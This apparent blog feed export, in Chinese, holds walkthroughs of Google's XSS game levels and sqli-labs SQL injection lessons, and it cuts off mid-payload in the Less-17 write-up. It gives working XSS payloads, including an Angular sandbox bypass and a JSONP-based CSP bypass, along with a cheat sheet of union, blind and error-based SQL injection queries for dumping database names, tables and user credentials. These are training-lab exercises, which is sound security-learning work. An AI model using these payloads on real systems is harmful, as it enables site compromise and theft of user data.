&lt;!-- Source: https://commons.wikimedia.org/wiki/File:Loading_icon.gif --&gt; &lt;img id=&quot;loading&quot; src=&quot;/static/img/loading.gif&quot; style=&quot;width: 50%&quot; onload=&quot;startTimer(&apos;3&apos;);&quot; /&gt; &lt;br&gt; &lt;div id=&quot;message&quot;&gt;Your timer will execute in 3 seconds.&lt;/div&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; 关键部分是函数StartTimer() 和 &lt;img id=&quot;loading&quot; src=&quot;/static/img/loading.gif&quot; style=&quot;width: 50%&quot; onload=&quot;startTimer(&apos;3&apos;);&quot; /&gt; 知识点&lt;script&gt; var a = &apos;a&apos; + alert(); // 或者 &apos;-&apos; 也可以，重点在于让 alert() 参与运算 // 当 alert() 参与运算的时候 // js 会尝试让 alert() 先执行 // 然后取其执行后的返回值再参与前面的运算 &lt;/script&gt; 再结合 img 标签的 onload 事件：onload = &quot;startTime(&apos;?&apos;)&quot;; // 这里需要把上面的知识点利用上 也就是把 alert() 以合适的位置插入 // 先尝试直接插入alert() onload = &quot;startTimer(&apos;alert()&apos;)&quot;; // startTimer(&apos;alert()&apos;); …… 这不直接当字符串传过去了吗…… 不行 // 看看上面的知识点…… // 插入 a&apos;+alert()+&apos;a onload = &quot;startTimer(&apos;a&apos;+alert()+&apos;a&apos;)&quot;; // 这应该差不多了…… 可是好像a没啥用啊，不传不也还是字符串吗，只不过是空字符串 // 插入 &apos;+alert()+&apos; onload = &quot;startTimer(&apos;&apos;+alert()+&apos;&apos;)&quot;; payload：&apos;+alert(&quot;xss&quot;)+&apos; http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;+alert(&quot;xss&quot;)+&apos; Level 3 画廊复杂的Web应用程序通常会在JavaScript中生成部分UI。一些常见的JS函数是执行接收器，这意味着它们将导致浏览器执行其输入中出现的任何脚本。 这个级别的应用程序正在使用一个这样的接收器。 由于您无法在应用程序的任何位置输入有效负载，因此您必须在提供的URL栏中手动编辑地址。目标是利用应用程序中的漏洞使其执行JavaScript alert（）函数。 测试随手输入参数非法的参数-1，可以看到页面回显了 -1 源码&lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/jquery2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;script&gt; window.onvalidationready = null; function validate() { $.post(location.pathname, {&apos;h&apos;: location.hash}, function(data, status) { $(&apos;#result&apos;).html(data); if (window.onvalidationready) { window.onvalidationready(); window.onvalidationready = null; } }); } function chooseTab(name) { var html = &quot;Cat &quot; + parseInt(name) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&apos;/static/img/cat&quot; + name + &quot;.jpg&apos; /&gt;&quot;; document.getElementById(&apos;tabContent&apos;).innerHTML = html; // Select the current tab var tabs = document.querySelectorAll(&apos;.tab&apos;); for (var i = 0; i &lt; tabs.length; i++) { if (tabs[i].id == &quot;tab&quot; + parseInt(name)) { tabs[i].className = &quot;tab active&quot;; } else { tabs[i].className = &quot;tab&quot;; } } window.location.hash = name; // Tell parent we&apos;ve changed the tab top.postMessage({&apos;url&apos;: self.location.toString()}, &quot;*&quot;); } function hashchange() { if (self.location.hash) { chooseTab(self.location.hash.substr(1)); validate(); } else { chooseTab(1); } } window.onload = hashchange; window.onhashchange = hashchange; &lt;/script&gt; &lt;/head&gt; &lt;body id=&quot;dom-demo&quot;&gt; &lt;div id=&quot;result&quot;&gt;&lt;/div&gt; &lt;div id=&quot;header&quot;&gt; &lt;span&gt;Cat Image&lt;/span&gt; &lt;span&gt;X&lt;/span&gt;&lt;span&gt;S&lt;/span&gt;&lt;span&gt;S&lt;/span&gt; Library &lt;/div&gt; &lt;!-- Source: https://www.flickr.com/photos/eraphernalia_vintage/2988746750 CC BY-SA 2.0 https://creativecommons.org/licenses/by-sa/2.0/ Created by Cheryl, published here without modifications --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab1&quot; onclick=&quot;chooseTab(&apos;1&apos;)&quot;&gt;Cat 1&lt;/div&gt; &lt;!-- Source: https://pixabay.com/en/cat-red-christmas-santa-hat-funny-1898512/ (License: Public Domain) --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab2&quot; onclick=&quot;chooseTab(&apos;2&apos;)&quot;&gt;Cat 2&lt;/div&gt; &lt;!-- Source: https://pixabay.com/en/cat-kitten-cute-funny-whiskers-1686730/ (License: Public Domain) --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab3&quot; onclick=&quot;chooseTab(&apos;3&apos;)&quot;&gt;Cat 3&lt;/div&gt; &lt;div id=&quot;tabContent&quot;&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 关键部分这里进行了文件名的拼接 需要注意的是通过 innerHTML 写到 div 中。而 innerHTML 方法直接写入的 … 并不会被执行。 img src=&apos;&apos; onerror=&apos;alert()&apos; /&gt; &lt;!-- 当图片加载错误的时候，就会执行 onerror 中的 alert() 方法 对于本关 我们只需要让他访问一个不存在的图片并让其执行 onerror=&apos;alert()&apos; 就OK了 --&gt; payload8&apos;onerror=&apos;alert(/xss/)&apos; http://www.xssgame.com/f/u0hrDTsXmyVJ/#8&apos;onerror=&apos;alert(/xss/)&apos; 用单引号截断1,使其 scr 指向’1’这个文件，并加入 onerror 事件，而因为’1’这个文件不存在，加载错误，转而执行 onerror 中的 alert() 方法。 Level 4 谷歌读者跨站点脚本不仅仅是正确转义数据。有时，即使没有将新元素注入DOM，攻击者也可以做坏事。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。重要的是解决方案不应该要求用户交互 - 打开URL应该足以触发警报。另请注意，alert（）应弹出挑战域 - 重定向到您自己的网页，并提醒那里不会被视为有效的解决方案。 测试Sign up &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;img src=&quot;/static/img/googlereader-logo.png&quot; /&gt;&lt;br&gt;&lt;br&gt; &lt;!-- We&apos;re ignoring the email, but the poor user will never know! --&gt; Enter email: &lt;input id=&quot;reader-email&quot; name=&quot;email&quot; value=&quot;&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;a href=&quot;confirm?next=welcome&quot;&gt;Next &gt;&gt;&lt;/a&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; Welcome! Today we are announcing the much anticipated&lt;br&gt; &lt;img src=&quot;/static/img/googlereader.png&quot; /&gt;&lt;br&gt; &lt;a href=&quot;signup?next=confirm&quot;&gt;Sign up&lt;/a&gt; for an exclusive Beta. &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; www.xssgame.com/f/__58a1wgqGgI/confirm?next=welcome &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; &lt;img src=&quot;/static/img/googlereader-logo.png&quot; /&gt;&lt;br&gt;&lt;br&gt; Thanks for signing up, you will be redirected soon... &lt;script&gt; setTimeout(function() { window.location = &apos;welcome&apos;; }, 1000); &lt;/script&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; 其中的’Welcome’像是我们 URL 中传入的参数。经传入其他参数测试，发现 window.location = 我们传入的参数。 知识点window.location = &apos;welcome&apos;; /* 这是一个页面重定向的操作 window.location 等同于 window.location.href 而 DOM 的 href 属性呢，支持这样写： &lt;a href=&apos;javascript:alert()&apos; &gt; &lt;/a&gt; */ payload:confirm?next=javascript:alert() http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert() Level 5 角Angular是一个非常流行的框架，在安全地开发应用程序时有一套自己的规则。其中之一是在Angular的模板系统运行之前修改DOM时应该小心。 这一挑战说明了为什么这很重要。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。 代码分析&lt;script&gt; angular.module(&apos;myApp&apos;, []) .controller(&apos;myController&apos;, [&apos;$scope&apos;, function ($scope) { $scope.query = &quot;&quot;; $scope.alert = window.alert; }]); var UTM_PARAMS = [&quot;utm_content&quot;, &quot;utm_medium&quot;, &quot;utm_source&quot;, &quot;utm_campaign&quot;, &quot;utm_term&quot;] if (location.search) { var params = location.search.substring(1).split(&apos;&amp;&apos;); for (var p in params) { var r = params[p].split(&apos;=&apos;); if (r.length == 2 &amp;&amp; UTM_PARAMS.indexOf(r[0]) != -1) { var el = document.getElementsByName(r[0]); if (el.length) el[0].value = decodeURIComponent(r[1]); } } } &lt;/script&gt; 先定义了一个数组，用来过滤 URL 中的参数。过滤出参数以后呢，去页面上找相应的节点。并给节点赋值。页面中的节点有这几个： &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;input id=&quot;demo2-query&quot; name=&quot;query&quot; maxlength=&quot;140&quot; ng-model=&quot;query&quot; placeholder=&quot;Enter query here...&quot;&gt; &lt;input name=&quot;utm_term&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;utm_campaign&quot; type=&quot;hidden&quot; value=&quot;cpc&quot;&gt; &lt;input id=&quot;demo2-button&quot; type=&quot;submit&quot; value=&quot;Search&quot;&gt; &lt;/form&gt; 可以看到utm_term 输入框属性是hidden 知识点什么是 Angular一款非常优秀的前端高级 JS 框架 其核心就是通过指令扩展了 HTML，通过表达式绑定数据到 HTML。 Angular不推崇DOM操作，也就是说在NG中几乎找不到任何的DOM操作 在Angular中怎么使用alert() Angular 表达式{{}}表示一个表达式，像模板引擎 hello:{{user.name}} {{“hello:”+user.name}} {{1+1}} {{[1,2,3,4]}} payload选择一个节点进行赋值 ?utm_term={{alert()}} http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{alert()}} Less 6 角2经常导致Angular表达式注入的编程模式是使用服务器端模板系统来生成Angular用作其自己的模板的HTML。即使服务器端模板保证输出中没有“普通”XSS，也是如此。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。 测试输入test,会发现输入的内容与输出的一致，尝试构造alert()进行测试，但是显示失败，这是因为 ng-non-bindable指令会告诉AngularJS当前的HTML元素或其子元素不需要编译 这里版本是1.2.0，是一个很早的版本&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt; 直接在网上搜索 Angular1.2.0 xss可得在文末我们找到了当前版本对应 Angular 1.2.0-1.2.1 的 Sandbox bypasses {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} 直接输入以上payload得到 &lt;form action=&quot;/f/rWKWwJGnAeyi/?query=a=&apos;constructor&apos;;b=};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()}}&quot; method=&quot;POST&quot;&gt; &lt;input id=&quot;demo2-query&quot; name=&quot;query&quot; maxlength=&quot;140&quot; ng-model=&quot;query&quot; placeholder=&quot;Enter query here...&quot;&gt; &lt;input id=&quot;demo2-button&quot; type=&quot;submit&quot; value=&quot;Search&quot;&gt; &lt;/form&gt; 可以看到是进行了过滤 左花括号被过滤了 { ｛ &amp;#123; --- 大括号左边部分Left curly brace &amp;lcub; ｝ &amp;#125; --- 大括号右边部分Right curly brace &amp;rcub; &amp;lcub;&amp;lcub;a=&apos;constructor&apos;;b=&amp;lcub;&amp;rcub;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)()&amp;rcub;&amp;rcub; 这里构造简单的也可以，不用拼接&amp;lcub;&amp;lcub;alert()}} Leval 7 CSP内容安全策略是防止注入成为可利用的XSS的重要工具。但这不是一个灵丹妙药 - 很多时候CSP政策都是可以绕过的。 这一挑战展示了一种常见的CSP旁路技术。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。 &lt;a href=&quot;?menu=YWJvdXQ=&quot;&gt;About Me&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/construction-safety-site-banner-1174806/ License: Public Domain --&gt; &lt;a href=&quot;?menu=Y2F0cw==&quot;&gt;Cats&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/cat-red-christmas-santa-hat-funny-1898512/ License: Public Domain --&gt; &lt;!-- Image source: https://pixabay.com/en/cat-kitten-cute-funny-whiskers-1686730/ License: Public Domain --&gt; &lt;a href=&quot;?menu=ZG9ncw==&quot;&gt;Dogs&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/goggles-dog-canine-pet-vacation-1472479/ License: Public Domain --&gt; &lt;!-- Image source: https://pixabay.com/en/dog-sidecar-sunglasses-funny-171773/ License: Public Domain --&gt; &lt;script src=&quot;/static/js/level7.js&quot;&gt;&lt;/script&gt; 代码分析?menu=ZG9ncw== menu后面的参数会进行改变可以看到加载了/static/js/level7.js /static/js/level7.js代码/** * Ask server side what to display. */ function main() { var m = location.search.match(&apos;menu=(.*)&apos;); var menu = m ? atob(m[1]) : &apos;about&apos;; document.write(&apos;&lt;script src=&quot;jsonp?menu=&apos; + encodeURIComponent(menu) + &apos;&quot;&gt;&lt;/script&gt;&apos;); } /** * Display stuff returned from server side. * @param {string} data - JSON data from server side */ function callback(data) { if (data.title) document.write(&apos;&lt;h1&gt;&apos; + data.title + &apos;&lt;/h1&gt;&apos;); if (data.pictures) data.pictures.forEach(function(url) { document.write(&apos;&lt;img src=&quot;/static/img/&apos; + url + &apos;&quot;&gt;&lt;br&gt;&lt;br&gt;&apos;); }); } main(); 解释如下function main(){ //找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 &lt;script&gt; 标签，来访问资源。 //atob 对应的是 Base64 编码方式的解码操作，是的，btoa就是编码 } function callback(data){ // 通过代码判断，data 应该是 json 格式。 // 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源 } main(); //执行 main 方法 我们注意到，其中开头的 callback 与我们 level7.js 中的 callback 方法的名称一样，而且内容中也含有相应的 title 与 pictures，我们基本可以确定这个 json 串返回后会自动执行 callback 函数，像是某种约定，我们去查查看这个 ‘jsonp’： JSONP：JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 元素标签，远程调用 JSON 文件来实现数据传递。 搜索发现其中callback可定义导致一些安全问题 我们用 callback 这个参数去我们的 Level 7 中测试一下?callback=3 callback执行成功，说明存在问题Level7.js中 function main() { var m = location.search.match(&apos;menu=(.*)&apos;);// 查找了一下当前 URL 中 &apos;menu=&apos; 后面的参数 var menu = m ? atob(m[1]) : &apos;about&apos;; // 如果没有获取到参数，则赋值为 &apos;about&apos; document.write(&apos;&lt;script src=&quot;jsonp?menu=&apos; + encodeURIComponent(menu) + &apos;&quot;&gt;&lt;/script&gt;&apos;); // 在页面中写入 &lt;script&gt; 标签 ，通过 src 请求资源 } 因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。 正常情况下，menu 的值会有4种可能，空值和 index 页面中三个 a 标签内静态的值，document.write 时写下的 script 标签内的 menu 参数有三种可能：’about’、’cats’、’dogs’。相应的会有三种 callback 的 JSON 对象。如果我传入一个其他参数，后台做没做 default 处理呢，会返回什么内容呢。我们这里试一下，因为他接受参数后要进行 base64 解码，所以我们传参时要先进行 base64 编码，’atob’ 函数是解码，编码函数猜也猜到应该是 ‘btoa’ 了~ 验证一下果然如此 而且我们发现报错后直接输的值为我们输入的值转码后的值 我们知道，如果我们输入的 menu 参数不是他期望的参数，他会把我们输入的东西显示在页面上。我们构建一个 img 标签传进去试一下： 执行失败，红色的报错部分显示由于CSP的原因，执行失败 PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= 现在我们可以利用的两个点是1、callback可以使用、2、menu传递错误的参数可以显示、 给 menu 传入经过 base64 编码后的： &lt;script src=&apos;jsonp?callback=alert()%3B//&apos;&gt;&lt;/script&gt; // 转义前为：&lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt; 会把 &lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt; 显示在页面上，script 标签会尝试加载，触发一个请求，script 而请求的返回内容为： alert();//({…})alert(); 后面被注释掉，执行 alert(); PayloadPHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+ http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+ 执行成功 Level 8 CSRF此挑战演示了许多Web安全性概念，例如CSP，跨站点请求伪造令牌和Self-XSS。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。在这种情况下，重要的是，解决方案URL也应该在其他浏览器中触发相同的结果 - 仅使用这些特定的cookie显示在此计算机上工作的URL是不够的。 关键代码分析/** * Read cookie. * @param {string} name - Name of the cookie * @returns {string} Cookie value */ function readCookie(name) { var match = RegExp(&apos;(?:^|;)\\s*&apos; + name + &apos;=([^;]*)&apos;).exec(document.cookie); return match &amp;&amp; match[1]; } var username = readCookie(&apos;name&apos;); if (username) { document.write(&apos;&lt;h1&gt;Welcome &apos; + username + &apos;!&lt;/h1&gt;&apos;); } document.addEventListener(&quot;DOMContentLoaded&quot;, function(event) { csrf_token.value = readCookie(&apos;csrf_token&apos;); }); 这个文件负责读取 cookie 的信息，如果读取到了 ‘name’ 的内容，就 document.write 到页面上。 测试一下 set尤其是这个url很奇怪value的值为输入的名字后面重定向到了index http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=testhahha&amp;redirect=index 输入一个非整数 可以看到页面显示了我们输入的小数、 http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=hello&amp;amount=0.22&amp;csrf_token=EVPQBFQCH2 url中的csrf_token作为参数传递给后台 得到的信息1、输入的不合法参数金额 account的值会显示出来 2、此页面没有CSP的标识 3、csrf_token 作为参数传递给后台。 在account处构造能够弹窗的代码 &lt;script&gt;alert()&lt;/script&gt; 失败 警告显示您执行了警报，但解决方案的服务器端验证失败。这可能意味着您的解决方案需要用户交互，或者不够通用，无法为不同的用户工作。请尝试使其无需用户交互，并且足够通用，以便适用于任何用户。它也可能是由使用绝对URL引用引起的 - 请避免使用它们 这里的意思由于不同的用户的原因，因为 csrf_token 每个人的都不同 token 很可能可以被 set，如果可行，那就通…… 你懂得。我们来通过 set 设置 token，通过 redirect 跳转到我们之前成功 alert() 的汇款链接，并把其中的 token 设置成我们前面 set 的值。OK，我们来构建URL： http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer?name=hello+kitty&amp;amount=&lt;script&gt;alert()&lt;/script&gt;&amp;csrf_token=Pass 这里要注意，我们如果直接这样访问，redirect 的值会是：transfer?name=hello kitty。也就是到下一个 &amp; 符会被截断。所以我们这里 把这个 ‘redirect=’ 后面的内容处理一下，chrome 控制台： encodeURIComponent(&apos;transfer?name=hello+kitty&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=Pass&apos;) 得到返回值： transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass 好我们替换一下 URL： http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass 参照http://or7.me/2017/08/03/Google_xssgame/http://www.freebuf.com/articles/web/133384.html]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
        <tag>XSS-game</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Summarize-Less-1-22_Basic-Injections]]></title>
    <url>%2F2018%2F07%2F04%2Fsqli-labs-Summarize-Less-1-22-Basic-Injections%2F</url>
    <content type="text"><![CDATA[sqli-labs-Summarize-Less-1-22(Basic-Injections)重要的系统数据库mysql.user 存储MySQL数据库的用户及用户权限信息 and (select count(*) from mysql.user)&gt; 判断是否具有读写权限 information_schema.user_privileges存储mysql中所有数据库的权限信息 information_schema.schemate 存储mysql中所有的数据库 遍历查询系统中所有数据库名 select schema_name from information_schema.schemata limit 0,1 information_schema.tables 存储mysql中所有数据库的表 遍历查询数据库中所有的表名 select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1 information_schema.columns存储mysql中所有数据库的列 遍历查询表中所有的列名 select column_name form information_schema.columns where table_name=&apos;users&apos; limit 0,1 遍历查询表中的数据 select password from security.users limit 0,1 常用操作常用语句select 用于输出信息 select 列名|（数字|字符串|函数）as 别名（as可以省略）[from ...] union 联合操作符，要求前后列数相同，数据类型相差不大 group by 分组 order by 排序，常用于猜解字段数 order by 列名|序列号 sql的switch语句 case expr when a then a** when b then b* else c* end if 函数，当expr1为真返回expr2否则返回expr3 if(expr1,expr2,expr3) 常用函数（获取系统信息）system_user() /*系统用户名 user() /*用户名 current_user() /*当前用户名 session_user() /*连接数据库的用户名 database() /*数据库名 version() /*MYSQL数据库版本 load_file() /*MYSQL读取本地文件的函数 @@datadir /*读取数据库路径 @@basedir MYSQL /*安装路径 @@version_compile_os /*操作系统 常用字符串函数concat() /*连接字符串 group_concat() concat_ws() /*连接字符串，第一个参数为分隔符 char() /*获得字符串 left(str, len) /*截取str左边len位 right(str, len) /*截取str右边len位 substring(str, pos, len) /*截取字符串 rand() /*生成0至1的随机数 floor(n) /*向下取整 name_conset(column_name, value) /*用来产生一个结果集合 sleep(seconds) 停止seconds秒，用于time-based盲注 benchmark(times, function) 将function执行times次，该函数可用于time-based盲注，例如（benchmark(500000, encode(‘a’,’b&apos;))） encode(str, passwd_str) 使用passwd_str加密str函数 判断是否可以注入使用标点符号(单引号，双引号，括号)判断注入，例如：http://aaa.com/s.php?id=1&apos; 如果返回页面提示syntax error，则说明有漏洞 通过附加逻辑运算判断注入，例如：http://aaa.com/s.php?id=1 and 1=1/and 1=2 and 1=1有返回，and 1=2无返回 通过算数运算判断注入点，例如：http://aaa.com/s.php?id=11-1 通过select语句判断注入点，例如：http://aaa.com/s.php?id=(select 10) 通过时间函数判断注入点，例如：http://aaa.com/s.php?id=2 and sleep(10) 或者http://aaa.com/s.php?id=2 and benchmark(500000, encode(&apos;msg&apos;,&apos;bbb&apos;)) 常规注入流程猜解列数order by n /*（注释符 /* # --） 查询mysql基本信息(假设数据库表有7列)and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/* 例如：select * from sedb.site_tb where 1=2 union select 1,2,concat_ws(char(32,58,32),0x7c,user(),database(),version()); 查询mysql数据库中有哪些数据库(注意使用limit限制查询的范围)and 1=2 union select 1,schema_name,3,4 from information_schema.schemata/* and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/* 例如：select * from site_tb where 1=2 union select 1, 2, group_concat(schema_name) from information_schema.schemata; 查询某个数据库中有哪些表（数据库名可能需要16进制）and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库名 and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库名 例如：select * from site_tb where 1=2 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&apos;sedb&apos;; 查询某个表中有哪些字段（表名、数据库名可能需要16进制）and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名 and table_schema=数据库名 limit 1,1/* and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名 and table_schema=数据库名/* 例如：select * from site_tb where 1=2 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&apos;site_tb&apos; and table_schema=&apos;sedb&apos;; 查询数据：and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/* MySql报错注入假设查询语句为： select name,password from test.user where id={参数} {参数}：按照mysql语法，where后可以跟and、union，因此可以1 and (select )以及1 union select 来触发报错注入 因此插入报错语句位置如下： select colum1,colum2 from table where id={0} and {1} union {2} 使用floor/left/right：select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a; select 1 from (select concat(user(),left(rand(),3)),count(*) from information_schema.tables group by 1)a; select 1 from (select concat(user(),right(rand(),3)),count(*) from information_schema.tables group by 1)a; 例如： select name,password from user where id=1 union select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos; 使用name_const：select 1 from (select name_const(version(),1),name_const(version(),1))x 例如： select name,password from test.user where id=1 union select 1 from (select name_const(version(),1), name_const(version(), 1))x; 使用updatexml：updatexml(1,concat(0x3a,user()),1) 例如： select name,password from test.user where id=2 and updatexml(1,concat(0x3a,user()),1); 使用extractvalue：extractvalue(1, concat(0x5c,version())) 例如： select name,password from test.user where id=2 and extractvalue(1, concat(0x5c, version())); 使用exp：exp(~(select*from(select user())x)) 例如： select name,password from test.user where id=exp(~(select*from(select user())x)); 使用GeometryCollection：GeometryCollection((select * from (select * from(select user())a)b)) polygon((select * from (select * from(select user())a)b)) multipoint((select * from (select * from(select user())a)b)) multilinestring((select * from (select * from(select user())a)b)) multipolygon((select * from (select * from(select user())a)b)) linestring((select * from (select * from(select user())a)b)) 例如： select name,password from test.user where id=2 and GeometryCollection((select * from (select * from(select user())a)b));]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-17-22]]></title>
    <url>%2F2018%2F04%2F26%2Fsqli-labs-Less-17-22%2F</url>
    <content type="text"><![CDATA[Less-17 POST-Updata Query-Error Based-String基于错误的更新查询post字符注入测试页面显示 PASSWORD RESET 重置密码 uname=test&amp;passwd=test2返回页面显示重置错误 uname=admin&amp;passwd=test2返回页面显示重置密码成功 应该是用户名正确即可重置密码 页面源代码 &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { //making sure uname is not injectable $uname=check_input($_POST[&apos;uname&apos;]); $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;); fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); //echo $row; if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; $row1 = $row[&apos;username&apos;]; //echo &apos;Your Login name:&apos;. $row1; $update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;&apos;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; 源代码分析定义了对输入的用户名检查的函数，要求不能为空，长度为15，超过则截取15位；若开启了魔术方法，则反斜线将被去除，但是两个反斜线将会被替换成一个；纯数字检测，若为字符则用mysql_real_escape_string对其进行转义，纯数字则转换位int型返回。该函数只对用户名进行了检验，而sql语句则只验证了是否存在该用户，没有验证对应的密码 SELECT username, password FROM users WHERE username= $uname LIMIT 0,1 修改成功则返回一张包含success的图片，失败则返回失败的图片。 payload这里参考网上有三种方式对update、insert、delete进行sql注入 1、 子查询注入子查询注入即为之前说到的双查询注入（具体可以参考Less-5） uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select 